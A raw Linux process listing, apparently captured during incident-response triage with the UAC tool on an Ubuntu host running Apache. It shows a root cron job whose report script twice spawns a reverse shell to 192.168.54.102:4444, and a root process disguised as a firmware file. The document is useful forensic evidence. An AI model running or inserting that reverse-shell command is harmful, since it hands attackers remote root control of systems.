    PID USER         ELAPSED COMMAND
   1849 mark        01:50:07 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
   1893 mark        01:50:07 /usr/libexec/gdm-wayland-session env GNOME_SHELL_SESSION_MODE=ubuntu /usr/bin/gnome-session --session=ubuntu
   1916 mark        01:50:07 /usr/libexec/gnome-session-binary --session=ubuntu
   1937 mark        01:50:07 /usr/libexec/xdg-document-portal
   1951 mark        01:50:07 /usr/libexec/xdg-permission-store
   1962 root        01:50:07 fusermount3 -o rw,nosuid,nodev,fsname=portal,auto_unmount,subtype=portal -- /run/user/1000/doc
   2005 mark        01:50:07 /usr/libexec/gcr-ssh-agent --base-dir /run/user/1000/gcr
   2008 mark        01:50:07 /usr/libexec/gnome-session-ctl --monitor
   2018 mark        01:50:07 /usr/libexec/gvfsd
   2030 mark        01:50:07 /usr/libexec/gvfsd-fuse /run/user/1000/gvfs -f
   2032 mark        01:50:07 /usr/libexec/gnome-session-binary --systemd-service --session=ubuntu
   2065 mark        01:50:07 /usr/bin/gnome-shell
   2066 mark        01:50:07 /usr/libexec/at-spi-bus-launcher --launch-immediately
   2078 mark        01:50:07 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 11 --address=unix:path=/run/user/1000/at-spi/bus
   2138 mark        01:50:06 /usr/libexec/at-spi2-registryd --use-gnome-session
   2147 mark        01:50:06 /snap/snapd-desktop-integration/315/usr/bin/snapd-desktop-integration
   2158 mark        01:50:06 /usr/libexec/gnome-shell-calendar-server
   2169 mark        01:50:06 /usr/libexec/evolution-source-registry
   2176 mark        01:50:06 /usr/bin/gjs -m /usr/share/gnome-shell/org.gnome.Shell.Notifications
   2182 mark        01:50:06 /usr/bin/ibus-daemon --panel disable
   2185 mark        01:50:06 /usr/libexec/gsd-a11y-settings
   2186 mark        01:50:06 /usr/libexec/gsd-color
   2187 mark        01:50:06 /usr/libexec/gsd-datetime
   2188 mark        01:50:06 /usr/libexec/gsd-housekeeping
   2189 mark        01:50:06 /usr/libexec/gsd-keyboard
   2190 mark        01:50:06 /usr/libexec/gsd-media-keys
   2191 mark        01:50:06 /usr/libexec/gsd-power
   2192 mark        01:50:06 /usr/libexec/gsd-print-notifications
   2193 mark        01:50:06 /usr/libexec/gsd-rfkill
   2195 mark        01:50:06 /usr/libexec/gsd-screensaver-proxy
   2197 mark        01:50:06 /usr/libexec/gsd-sharing
   2201 mark        01:50:06 /usr/libexec/gsd-smartcard
   2202 mark        01:50:06 /usr/libexec/gsd-sound
   2206 mark        01:50:06 /usr/libexec/gsd-wacom
   2224 mark        01:50:06 /usr/libexec/evolution-data-server/evolution-alarm-notify
   2258 mark        01:50:05 /usr/bin/Xwayland :0 -rootless -noreset -accessx -core -auth /run/user/1000/.mutter-Xwaylandauth.7QTFG3 -listenfd 4 -listenfd 5 -displayfd 6 -initfd 7 -byteswappedclients
   2267 mark        01:50:05 /usr/libexec/gsd-disk-utility-notify
   2324 mark        01:50:05 /usr/libexec/goa-daemon
   2379 mark        01:50:05 /usr/libexec/gvfs-udisks2-volume-monitor
   2411 mark        01:50:05 /usr/libexec/evolution-calendar-factory
   2412 mark        01:50:05 /usr/libexec/ibus-memconf
   2413 mark        01:50:05 /usr/libexec/ibus-extension-gtk3
   2418 mark        01:50:05 /usr/libexec/ibus-portal
   2427 mark        01:50:05 /usr/libexec/goa-identity-service
   2430 mark        01:50:05 /usr/libexec/gsd-printer
   2455 mark        01:50:05 /usr/libexec/gvfs-goa-volume-monitor
   2459 mark        01:50:05 /usr/libexec/evolution-addressbook-factory
   2470 mark        01:50:05 /usr/libexec/gvfs-afc-volume-monitor
   2478 mark        01:50:05 /usr/libexec/gvfs-gphoto2-volume-monitor
   2485 mark        01:50:05 /usr/libexec/gvfs-mtp-volume-monitor
   2506 mark        01:50:05 /usr/libexec/ibus-engine-simple
   2528 mark        01:50:05 /usr/libexec/dconf-service
   2547 mark        01:50:04 /usr/libexec/gvfsd-trash --spawner :1.20 /org/gtk/gvfs/exec_spaw/0
   2559 mark        01:50:04 /usr/libexec/gsd-xsettings
   2612 root        01:50:04 [kworker/u12:1]
   2614 mark        01:50:04 /usr/bin/gjs -m /usr/share/gnome-shell/org.gnome.ScreenSaver
   2658 mark        01:50:04 /usr/libexec/xdg-desktop-portal
   2670 mark        01:50:03 /usr/libexec/ibus-x11
   2677 mark        01:50:03 /usr/libexec/tracker-miner-fs-3
   2678 mark        01:50:03 /usr/libexec/xdg-desktop-portal-gnome
   2682 mark        01:50:03 /usr/libexec/mutter-x11-frames
   2709 mark        01:50:03 /usr/libexec/gvfsd-metadata
   2712 mark        01:50:03 /usr/libexec/xdg-desktop-portal-gtk
   2750 mark        01:49:59 /usr/bin/python3 /usr/bin/gnome-terminal --wait
   2751 mark        01:49:59 /usr/bin/gnome-terminal.real --wait
   2757 mark        01:49:59 /usr/libexec/gnome-terminal-server
   2765 mark        01:49:59 bash
   2817 mark        01:49:39 systemctl status apache2
   2818 mark        01:49:39 pager
   2828 mark        01:49:05 /usr/bin/update-notifier
   2906 mark        01:46:26 /snap/firefox/7355/usr/lib/firefox/firefox
   2976 mark        01:46:25 /snap/firefox/7355/usr/lib/firefox/crashhelper 2906 9 /tmp/ 11
   3053 mark        01:46:24 /snap/firefox/7355/usr/lib/firefox/firefox -contentproc -ipcHandle 0 -signalPipe 1 -initialChannelId {ca6a72ff-4fc0-4b33-babd-453649baae68} -parentPid 2906 -greomni /snap/firefox/7355/usr/lib/firefox/omni.ja -appomni /snap/firefox/7355/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/7355/usr/lib/firefox/browser 1 forkserver
   3060 mark        01:46:24 /snap/firefox/7355/usr/lib/firefox/firefox -contentproc -parentBuildID 20251118110623 -prefsHandle 0:35081 -prefMapHandle 1:276878 -sandboxReporter 2 -chrootClient 3 -ipcHandle 4 -initialChannelId {6b6a53dd-96bc-45a7-8d9f-468e0a436440} -parentPid 2906 -crashReporter 5 -crashHelper 6 -appDir /snap/firefox/7355/usr/lib/firefox/browser 2 socket
   3095 mark        01:46:24 /snap/firefox/7355/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:35253 -prefMapHandle 1:276878 -jsInitHandle 2:224660 -parentBuildID 20251118110623 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {3eaca145-d9d4-4e36-8608-1564e07e9d30} -parentPid 2906 -crashReporter 6 -crashHelper 7 -greomni /snap/firefox/7355/usr/lib/firefox/omni.ja -appomni /snap/firefox/7355/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/7355/usr/lib/firefox/browser 3 tab
   3106 mark        01:46:24 /snap/firefox/7355/usr/lib/firefox/firefox -contentproc -parentBuildID 20251118110623 -prefsHandle 0:35253 -prefMapHandle 1:276878 -sandboxReporter 2 -chrootClient 3 -ipcHandle 4 -initialChannelId {bf8993e8-537a-49b8-a48b-9a73bfdc19de} -parentPid 2906 -crashReporter 5 -crashHelper 6 -appDir /snap/firefox/7355/usr/lib/firefox/browser 4 rdd
   3142 mark        01:46:23 /usr/bin/snap userd
   3292 mark        01:46:23 /snap/firefox/7355/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:45532 -prefMapHandle 1:276878 -jsInitHandle 2:224660 -parentBuildID 20251118110623 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {ac9ce2e4-958e-4d4a-9cc6-074473622295} -parentPid 2906 -crashReporter 6 -crashHelper 7 -greomni /snap/firefox/7355/usr/lib/firefox/omni.ja -appomni /snap/firefox/7355/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/7355/usr/lib/firefox/browser 5 tab
   3313 mark        01:46:23 /snap/firefox/7355/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:42383 -prefMapHandle 1:276878 -jsInitHandle 2:224660 -parentBuildID 20251118110623 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {66507e1a-5169-42d5-b957-4473adebf1ad} -parentPid 2906 -crashReporter 6 -crashHelper 7 -greomni /snap/firefox/7355/usr/lib/firefox/omni.ja -appomni /snap/firefox/7355/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/7355/usr/lib/firefox/browser 6 tab
   3655 mark        01:46:21 /snap/firefox/7355/usr/lib/firefox/firefox -contentproc -parentBuildID 20251118110623 -sandboxingKind 0 -prefsHandle 0:46526 -prefMapHandle 1:276878 -sandboxReporter 2 -chrootClient 3 -ipcHandle 4 -initialChannelId {65707cd9-a94d-4233-be6e-f9839e4e1f3e} -parentPid 2906 -crashReporter 5 -crashHelper 6 -appDir /snap/firefox/7355/usr/lib/firefox/browser 7 utility
   3663 mark        01:46:21 /snap/firefox/7355/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:43323 -prefMapHandle 1:276878 -jsInitHandle 2:224660 -parentBuildID 20251118110623 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {adde2cdc-39d7-499b-a18e-f46f14ad3ba0} -parentPid 2906 -crashReporter 6 -crashHelper 7 -greomni /snap/firefox/7355/usr/lib/firefox/omni.ja -appomni /snap/firefox/7355/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/7355/usr/lib/firefox/browser 8 tab
   3668 mark        01:46:21 /snap/firefox/7355/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:43323 -prefMapHandle 1:276878 -jsInitHandle 2:224660 -parentBuildID 20251118110623 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {bb1bf7cd-f43c-44e2-83d7-055c45b3c5bd} -parentPid 2906 -crashReporter 6 -crashHelper 7 -greomni /snap/firefox/7355/usr/lib/firefox/omni.ja -appomni /snap/firefox/7355/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/7355/usr/lib/firefox/browser 9 tab
   3838 mark        01:46:20 /snap/firefox/7355/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:43323 -prefMapHandle 1:276878 -jsInitHandle 2:224660 -parentBuildID 20251118110623 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {3a289e6b-d107-49e3-b034-54d6b9cb7073} -parentPid 2906 -crashReporter 6 -crashHelper 7 -greomni /snap/firefox/7355/usr/lib/firefox/omni.ja -appomni /snap/firefox/7355/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/7355/usr/lib/firefox/browser 10 tab
   3990 root        01:43:06 /usr/libexec/fwupd/fwupd
   4083 mark        01:41:22 /usr/libexec/gvfsd-recent --spawner :1.20 /org/gtk/gvfs/exec_spaw/1
   4307 mark        01:40:07 sh -c /usr/bin/nautilus --gapplication-service
   4308 mark        01:40:07 /usr/bin/nautilus --gapplication-service
   4503 www-data    01:35:14 /usr/sbin/apache2 -k start
   4504 www-data    01:35:14 /usr/sbin/apache2 -k start
   4506 www-data    01:35:14 /usr/sbin/apache2 -k start
   4509 www-data    01:35:14 /usr/sbin/apache2 -k start
   4513 www-data    01:35:13 /usr/sbin/apache2 -k start
   4515 www-data    01:35:13 /usr/sbin/apache2 -k start
   4518 www-data    01:35:13 /usr/sbin/apache2 -k start
   4521 www-data    01:35:13 /usr/sbin/apache2 -k start
   4522 www-data    01:35:13 /usr/sbin/apache2 -k start
   4583 root        01:31:45 [kworker/1:0-events]
   4763 root        01:22:28 /usr/sbin/CRON -f -L 0
   4765 root        01:22:28 /bin/sh -c /opt/company/scripts/generate_reports.sh
   4767 root        01:22:28 /bin/bash /opt/company/scripts/generate_reports.sh
   4782 root        01:22:26 bash -c bash -i >& /dev/tcp/192.168.54.102/4444 0>&1
   4783 root        01:22:26 bash -i
   5412 root        01:18:50 [kworker/R-ib-comp-wq]
   5414 root        01:18:50 [kworker/R-ib-comp-unb-wq]
   5415 root        01:18:50 [kworker/R-ib_mcast]
   5416 root        01:18:50 [kworker/R-ib_nl_sa_wq]
   5544 root        01:05:36 [kworker/1:0H]
   5792 root           53:51 [kworker/u9:4-flush-8:0]
   5844 root           47:27 /usr/sbin/CRON -f -L 0
   5845 root           47:27 /bin/sh -c /opt/company/scripts/generate_reports.sh
   5846 root           47:27 /bin/bash /opt/company/scripts/generate_reports.sh
   5861 root           47:26 bash -c bash -i >& /dev/tcp/192.168.54.102/4444 0>&1
   5862 root           47:26 bash -i
   5869 root           47:18 sudo -i
   5877 root           47:18 /usr/lib/systemd/systemd --user
   5879 root           47:18 (sd-pam)
   5884 root           47:18 [psimon]
   5891 root           47:18 /snap/snapd-desktop-integration/315/usr/bin/snapd-desktop-integration
   5893 root           47:18 -bash
   5925 root           47:18 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
   5926 root           47:18 /usr/libexec/xdg-document-portal
   5930 root           47:18 /usr/libexec/xdg-permission-store
   5937 root           47:18 fusermount3 -o rw,nosuid,nodev,fsname=portal,auto_unmount,subtype=portal -- /run/user/0/doc
   6052 root           47:18 /snap/snapd-desktop-integration/315/usr/bin/snapd-desktop-integration
   6057 root           47:13 [kworker/u9:3-writeback]
   6091 root           42:32 [kworker/u10:3-events_power_efficient]
   6275 root           33:19 [kworker/u10:2-events_power_efficient]
   6454 root           33:13 [psimon]
   6465 root           33:03 /usr/lib/firmware/iwlwifi-5000-5.ucode
   6666 mark           22:32 gjs /usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js -E -P /usr/share/gnome-shell/extensions/ding@rastersoft.com/app
   6729 root           22:07 [kworker/0:2H]
   6928 root           20:24 [kworker/0:0-events]
   7005 mark           18:46 bash
   7035 mark           17:33 bash
   7182 root           11:56 [kworker/u9:2-writeback]
   7196 root           10:34 [kworker/u10:1-events_unbound]
   7210 root           10:24 [kworker/0:1-cgroup_destroy]
   9204 root           07:27 [kworker/1:1]
  11225 root           03:18 [kworker/u10:0-events_power_efficient]
  11413 root           02:24 [kworker/u9:0-flush-8:0]
  11462 mark           01:40 bash
  11470 root           01:20 [kworker/u9:1-flush-8:0]
  11483 root           00:21 [kworker/0:2]
  11700 root           00:04 sudo ./uac -p ir_triage /tmp
  11701 root           00:02 sudo ./uac -p ir_triage /tmp
  11702 root           00:02 /bin/sh ./uac -p ir_triage /tmp
  13171 root           00:00 /bin/sh ./uac -p ir_triage /tmp
  13480 root           00:00 ps -axo pid,user,etime,args
